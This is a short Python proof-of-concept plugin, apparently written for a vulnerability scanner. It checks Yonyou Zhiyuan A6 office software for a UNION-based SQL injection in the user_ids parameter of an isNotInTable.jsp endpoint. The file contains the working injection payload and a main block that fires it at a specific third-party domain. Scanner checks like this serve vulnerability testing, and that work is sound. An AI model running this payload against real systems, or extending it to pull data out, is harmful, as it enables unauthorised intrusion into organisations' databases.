#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author: range
#ref: http://wooyun.org/bugs/wooyun-2010-0110312  http://www.beebeeto.com/pdb/poc-2015-0133/
 
def assign(service, arg):
    if service == "yongyou_zhiyuan_a6":
        return True, arg
        
def audit(arg):
    payload ="/yyoa/ext/trafaxserver/ExtnoManage/isNotInTable.jsp?user_ids=(17)%20union%20all%20select%20md5(3.1415)#"
    url = arg + payload
    code, head, res, errcode, _ = curl.curl2(url)
    if (code != 404) and '63e1f04640e83605c1d177544a5a0488' in res:
        security_hole(url + '   found sql injection!')

if __name__ == '__main__':
    from dummy import *
    audit(assign('yongyou_zhiyuan_a6', 'http://oa.wnq.com.cn/')[1])